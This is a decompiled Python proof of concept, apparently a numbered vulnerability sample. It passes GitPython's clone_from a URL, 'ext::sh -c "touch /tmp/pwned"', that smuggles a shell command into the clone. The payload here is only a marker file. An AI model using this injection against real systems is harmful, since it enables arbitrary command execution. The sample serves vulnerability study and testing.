# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 360_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 418 bytes
from git import Repo

def clone_repository(malicious_url):
    r = Repo.init("", bare=True)
    r.clone_from(malicious_url, "tmp")


malicious_url = 'ext::sh -c "touch /tmp/pwned"'
clone_repository(malicious_url)

# okay decompiling 360_1.pyc
